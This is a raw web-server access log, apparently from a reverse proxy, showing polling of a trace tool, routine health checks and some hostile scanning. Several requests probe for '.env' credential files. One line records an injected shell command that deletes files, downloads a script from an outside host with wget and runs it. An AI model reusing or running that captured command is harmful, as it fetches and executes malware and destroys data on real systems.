173.48.140.140 - - [16/Dec/2023:01:25:14 +0000] "GET /trace/polltrace.php?id=n8mawvu2i HTTP/2.0" 200 713 "-" "-" 311 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:25:15 +0000] "GET /trace/polltrace.php?id=n8mawvu2i HTTP/2.0" 200 713 "-" "-" 313 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:25:15 +0000] "GET /trace/pollping.php?id=6za9in5lz HTTP/2.0" 200 91 "-" "-" 314 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:25:16 +0000] "GET /trace/polltrace.php?id=n8mawvu2i HTTP/2.0" 200 713 "-" "-" 315 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:01:25:16 +0000] "GET /trace/pollping.php?id=6za9in5lz HTTP/2.0" 200 91 "-" "-" 316 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:01:25:17 +0000] "GET /trace/polltrace.php?id=n8mawvu2i HTTP/2.0" 200 715 "-" "-" 318 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:25:17 +0000] "GET /trace/pollping.php?id=6za9in5lz HTTP/2.0" 200 90 "-" "-" 317 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:25:18 +0000] "GET /trace/pollping.php?id=6za9in5lz HTTP/2.0" 200 100 "-" "-" 320 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:25:18 +0000] "GET /trace/polltrace.php?id=n8mawvu2i HTTP/2.0" 200 715 "-" "-" 319 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:25:18 +0000] "GET /trace/cleanping.php?id=6za9in5lz HTTP/2.0" 200 71 "-" "-" 321 "livetrace@docker" "http://172.29.0.3:80" 4ms
173.48.140.140 - - [16/Dec/2023:01:25:19 +0000] "GET /trace/polltrace.php?id=n8mawvu2i HTTP/2.0" 200 715 "-" "-" 322 "livetrace@docker" "http://172.29.0.3:80" 3ms
173.48.140.140 - - [16/Dec/2023:01:25:20 +0000] "GET /trace/polltrace.php?id=n8mawvu2i HTTP/2.0" 200 968 "-" "-" 323 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:25:20 +0000] "GET /trace/cleantrace.php?id=n8mawvu2i HTTP/2.0" 200 72 "-" "-" 324 "livetrace@docker" "http://172.29.0.3:80" 3ms
159.203.109.206 - - [16/Dec/2023:01:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 325 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:25:29 +0000] "GET /trace/ HTTP/2.0" 200 4092 "-" "-" 326 "livetrace@docker" "http://172.29.0.3:80" 5ms
167.71.120.76 - - [16/Dec/2023:01:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 327 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 328 "www@docker" "http://172.29.0.8:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:26:24 +0000] "GET /trace/startping.php?id=7jhka35ba HTTP/2.0" 200 105 "-" "-" 329 "livetrace@docker" "http://172.29.0.3:80" 5ms
173.48.140.140 - - [16/Dec/2023:01:26:24 +0000] "GET /trace/starttrace.php?id=4qnirukmh HTTP/2.0" 200 106 "-" "-" 330 "livetrace@docker" "http://172.29.0.3:80" 4ms
173.48.140.140 - - [16/Dec/2023:01:26:25 +0000] "GET /trace/pollping.php?id=7jhka35ba HTTP/2.0" 200 90 "-" "-" 331 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:26:25 +0000] "GET /trace/polltrace.php?id=4qnirukmh HTTP/2.0" 200 688 "-" "-" 332 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:26:26 +0000] "GET /trace/pollping.php?id=7jhka35ba HTTP/2.0" 200 90 "-" "-" 333 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:26:26 +0000] "GET /trace/polltrace.php?id=4qnirukmh HTTP/2.0" 200 688 "-" "-" 334 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:26:27 +0000] "GET /trace/pollping.php?id=7jhka35ba HTTP/2.0" 200 91 "-" "-" 335 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:26:27 +0000] "GET /trace/polltrace.php?id=4qnirukmh HTTP/2.0" 200 688 "-" "-" 336 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:26:28 +0000] "GET /trace/pollping.php?id=7jhka35ba HTTP/2.0" 200 90 "-" "-" 337 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:26:28 +0000] "GET /trace/polltrace.php?id=4qnirukmh HTTP/2.0" 200 711 "-" "-" 338 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:26:29 +0000] "GET /trace/polltrace.php?id=4qnirukmh HTTP/2.0" 200 711 "-" "-" 340 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:26:29 +0000] "GET /trace/pollping.php?id=7jhka35ba HTTP/2.0" 200 90 "-" "-" 339 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:26:30 +0000] "GET /trace/pollping.php?id=7jhka35ba HTTP/2.0" 200 91 "-" "-" 342 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:26:30 +0000] "GET /trace/polltrace.php?id=4qnirukmh HTTP/2.0" 200 711 "-" "-" 341 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:26:31 +0000] "GET /trace/polltrace.php?id=4qnirukmh HTTP/2.0" 200 713 "-" "-" 344 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:26:31 +0000] "GET /trace/pollping.php?id=7jhka35ba HTTP/2.0" 200 90 "-" "-" 343 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:26:32 +0000] "GET /trace/polltrace.php?id=4qnirukmh HTTP/2.0" 200 713 "-" "-" 345 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:26:32 +0000] "GET /trace/pollping.php?id=7jhka35ba HTTP/2.0" 200 100 "-" "-" 346 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:26:33 +0000] "GET /trace/cleanping.php?id=7jhka35ba HTTP/2.0" 200 71 "-" "-" 347 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:26:33 +0000] "GET /trace/polltrace.php?id=4qnirukmh HTTP/2.0" 200 713 "-" "-" 348 "livetrace@docker" "http://172.29.0.3:80" 1ms
173.48.140.140 - - [16/Dec/2023:01:26:35 +0000] "GET /trace/polltrace.php?id=4qnirukmh HTTP/2.0" 200 965 "-" "-" 349 "livetrace@docker" "http://172.29.0.3:80" 2ms
173.48.140.140 - - [16/Dec/2023:01:26:35 +0000] "GET /trace/cleantrace.php?id=4qnirukmh HTTP/2.0" 200 72 "-" "-" 350 "livetrace@docker" "http://172.29.0.3:80" 2ms
167.71.120.76 - - [16/Dec/2023:01:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 351 "www@docker" "http://172.29.0.8:80" 1ms
57.129.23.166 - - [16/Dec/2023:01:27:12 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 352 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:01:27:12 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 353 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:01:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 354 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 355 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 356 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 357 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 358 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 359 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 360 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 361 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 362 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 363 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 364 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 365 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 366 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 367 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 368 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 369 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 370 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 371 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 372 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 373 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 374 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 375 "www@docker" "http://172.29.0.8:80" 1ms
78.153.140.221 - - [16/Dec/2023:01:38:08 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 376 "web-to-websecure@internal" "-" 0ms
78.153.140.221 - - [16/Dec/2023:01:38:09 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 377 "-" "-" 0ms
78.153.140.221 - - [16/Dec/2023:01:38:09 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 378 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:01:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 379 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 380 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 381 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 382 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 383 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 384 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 385 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 386 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 387 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 388 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 389 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 390 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 391 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 392 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 393 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 394 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 395 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 396 "www@docker" "http://172.29.0.8:80" 1ms
57.129.23.166 - - [16/Dec/2023:01:46:58 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 397 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [16/Dec/2023:01:46:58 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 398 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:01:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 399 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 400 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 401 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 402 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 403 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 404 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 405 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 406 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 407 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 408 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 409 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 410 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 411 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 412 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 413 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 414 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 415 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 416 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:01:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 417 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 418 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 419 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:01:57:32 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 420 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:01:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 421 "www@docker" "http://172.29.0.8:80" 0ms
117.209.123.104 - - [16/Dec/2023:01:57:57 +0000] "GET /shell?cd+/tmp&rm+-rf+*&wget+http://pvp-rivals.com/jaws.sh&chmod+777+*&sh+/tmp/jaws.sh HTTP/1.1" 301 17 "-" "-" 422 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:01:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 423 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:01:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 424 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:01:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 425 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:01:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 426 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:01:59:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 427 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:02:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 428 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 429 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 430 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 431 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 432 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 433 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 434 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 435 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 436 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 437 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 438 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 439 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 440 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 441 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 442 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 443 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 444 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 445 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 446 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 447 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 448 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 449 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 450 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 451 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 452 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 453 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 454 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 455 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 456 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 457 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 458 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 459 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 460 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 461 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 462 "www@docker" "http://172.29.0.8:80" 0ms
54.36.115.221 - - [16/Dec/2023:02:17:34 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 463 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [16/Dec/2023:02:17:34 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 464 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:02:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 465 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 466 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 467 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 468 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 469 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 470 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 471 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 472 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 473 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 474 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:02:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 475 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 476 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 477 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:02:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 478 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:02:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 479 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:02:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 481 "www@docker" "http://172.29.0.8:80" 0ms
12.188.169.2 - - [16/Dec/2023:02:25:21 +0000] "GET /trace/ HTTP/2.0" 200 4059 "-" "-" 480 "livetrace@docker" "http://172.29.0.3:80" 5043ms
12.188.169.2 - - [16/Dec/2023:02:25:26 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 200 1387 "-" "-" 482 "livetrace@docker" "http://172.29.0.3:80" 0ms
12.188.169.2 - - [16/Dec/2023:02:25:34 +0000] "GET /trace/startping.php?id=ygf50kju9 HTTP/2.0" 200 103 "-" "-" 483 "livetrace@docker" "http://172.29.0.3:80" 3ms
12.188.169.2 - - [16/Dec/2023:02:25:35 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 484 "livetrace@docker" "http://172.29.0.3:80" 1ms
12.188.169.2 - - [16/Dec/2023:02:25:36 +0000] "GET /trace/pollping.php?id=ygf50kju9 HTTP/2.0" 200 43 "-" "-" 485 "livetrace@docker" "http://172.29.0.3:80" 1ms
